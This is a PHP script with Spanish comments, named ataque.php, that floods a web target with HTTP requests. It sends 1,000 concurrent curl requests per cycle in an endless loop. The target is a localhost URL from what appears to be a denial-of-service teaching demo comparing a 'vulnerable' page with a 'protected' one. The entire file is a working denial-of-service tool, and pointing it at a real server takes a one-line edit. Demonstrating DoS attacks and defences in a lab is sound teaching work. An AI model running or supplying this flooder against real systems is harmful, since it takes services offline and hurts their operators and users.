<?php
// ataque.php - VERSIÓN MULTI-HILO (Flooder)
// Ejecutar preferiblemente desde terminal: php ataque.php

// 1. CONFIGURACIÓN
// $objetivo = "http://localhost/demo_dos/vulnerable.php";
$objetivo = "http://localhost/demo_dos/protegido.php";

$cantidad_hilos = 1000; // Número de peticiones simultáneas por lote

echo "--- INICIANDO ATAQUE DE DENEGACIÓN DE SERVICIO ---\n";
echo "Objetivo: $objetivo\n";
echo "Hilos simultáneos: $cantidad_hilos\n";
echo "Presiona Ctrl+C para detener.\n\n";

set_time_limit(0);

// Inicializamos el multi-curler
$mh = curl_multi_init();
$curl_handles = [];

// Función para crear una petición
function crearPeticion($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout corto para no quedarnos pegados
    return $ch;
}

// Bucle Infinito del Ataque
$ciclo = 0;
while (true) {
    $ciclo++;
    
    // 1. Llenar el cargador con peticiones
    for ($i = 0; $i < $cantidad_hilos; $i++) {
        $ch = crearPeticion($objetivo);
        curl_multi_add_handle($mh, $ch);
        $curl_handles[$i] = $ch;
    }

    // 2. DISPARAR TODAS A LA VEZ
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        usleep(1000); // Pequeña pausa para no quemar TU cpu
    } while ($running > 0);

    // 3. Limpiar y recargar
    foreach ($curl_handles as $ch) {
        // Opcional: Obtener código HTTP para ver si funcionó
        // $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    
    echo "Ciclo #$ciclo completado: $cantidad_hilos peticiones lanzadas.\r";
}
?>